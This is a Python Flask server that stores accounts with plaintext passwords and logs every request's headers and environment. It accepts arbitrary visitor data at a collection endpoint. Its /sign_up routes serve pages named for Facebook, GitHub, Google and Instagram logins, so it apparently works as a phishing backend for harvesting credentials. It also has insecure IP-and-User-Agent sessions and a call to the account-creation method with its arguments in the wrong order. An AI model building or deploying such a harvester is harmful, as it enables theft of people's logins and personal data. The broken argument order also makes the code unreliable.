from flask import Flask, request, send_file, redirect
import json, threading, time, random

data = {"users": {}}
datafile = "data.json"
logfile = "logs.txt"
sessions = {}
lock = threading.Lock()

def save():
    global data
    try:
        with open(datafile, "w") as f:
            f.write(json.dumps(data, indent=1, default=repr))
    except:
        pass

def load():
    global data
    try:
        with open(datafile, "r") as f:
            data = json.loads(f.read())
    except Exception as e:
        print(e)

load()

class User:
    def __init__(self):
        self.username = None
    def create(self, user, email, bdate, phone, key, logs):
        global data
        user = str(user);email = str(email);bdate = float(bdate);phone = str(phone);key = str(key);logs = dict(logs)
        if len(user) < 5:
            raise ValueError("Username must be longer than 5 characters.")
        user = user[:20]
        if len(email) < 5:
            raise ValueError("Invalid email.")
        email = email[:64]
        if "." not in email or "@" not in email:
            raise ValueError("Invalid email.")
        if len(phone) < 5:
            raise ValueError("Invalid phone number.")
        phone = phone[:30]
        if len(key) < 8:
            raise ValueError("Invalid password.")
        key = key[:128]
        user = "".join([h if h in "qwertyuopasdfghjklizxcvbnmQWERTYUOPASDFGHJKLZXCVBNM1234567890" else "" for h in user])
        if len(user) < 5:
            user = "user0"+user
        if user not in data["users"]:
            with lock:
                data["users"][user] = {"email": email, "phone": phone, "key": key, "logs": [logs], "data": []}
            save()
            self.username = user
            return True
        else:
            raise ValueError("User already exists.")
    def login(self, user, key, logs):
        global data
        if user in data["users"]:
            with lock:
                data["users"][user]["logs"].append(logs)
            save()
            if data["users"][user]["key"] == key:
                self.username = user
                return True
            else:
                raise ValueError("Invalid password or username.")
        else:
            raise ValueError("Invalid password or username.")

app = Flask(__name__)

def get_reqlogs():
    return {"time": time.time(), "headers": request.headers, "environ": request.environ, "data": request.data[:1024]}

@app.before_request
def before_request_do():
    global data
    logs = get_reqlogs()
    with open(logfile, "a") as f:
        f.write(json.dumps(logs, default=repr)+"\n")

@app.route("/api/create_acc", methods=["POST"])
def create_account_api():
    try:
        u = User()
        d = request.get_json()
        user, key, email, bdate, phone = d.get("username", str(random.randint(1000000, 9999999))), d.get("password", "password"), d.get("email", "user@mail.com"), d.get("bdate", 1), d.get("phone", "00000000000")
        logs = get_reqlogs()
        r = u.create(user, key, email, bdate, phone, logs)
        if r:
            return "Successfuly.", 200
        else:
            return "Error.", 400
    except Exception as e:
        return str(e), 400

@app.route("/api/login_acc", methods=["POST"])
def login_account_api():
    global sessions
    try:
        u = User()
        d = request.get_json()
        user, key = d["username"], d["password"]
        logs = get_reqlogs()
        r = u.login(user, key, logs)
        if r:
            with lock:
                sessions[(request.remote_addr, request.headers.get("User-Agent", ""))] = user
            return "Successfuly.", 200
        else:
            return "Error.", 400
    except Exception as e:
        return str(e), 400

@app.route("/quit_acc")
def quit_acc_api():
    global sessions
    t = (request.remote_addr, request.headers.get("User-Agent", ""))
    if t in sessions:
        with lock:
            del sessions[t]
    return redirect("/")

def get_acc():
    global sessions
    t = (request.remote_addr, request.headers.get("User-Agent", ""))
    if t in sessions:
        u = User()
        u.username = sessions[t]
        return u

@app.route("/api/send_data", methods=["POST"])
def send_data():
    global users
    user = get_acc()
    if user:
        with lock:
            data["users"][user.username]["data"].append([get_reqlogs(), request.get_json()])
    else:
        with open(logfile, "a") as f:
            f.write(json.dumps({"logs": get_reqlogs(), "data": request.get_json()}, default=repr)+"\n")
    return "Successfuly.", 200

@app.route("/sign_up")
def sign_up_page():
    return send_file("sign_up.html", mimetype="text/html")

@app.route("/sign_up/facebook")
def facebook_login_page():
    return send_file("facebook.html", mimetype="text/html")

@app.route("/sign_up/github")
def github_login_page():
    return send_file("github.html", mimetype="text/html")

@app.route("/sign_up/google")
def google_login_page():
    return send_file("google.html", mimetype="text/html")

@app.route("/sign_up/instagram")
def instagram_login_page():
    return send_file("instagram.html", mimetype="text/html")
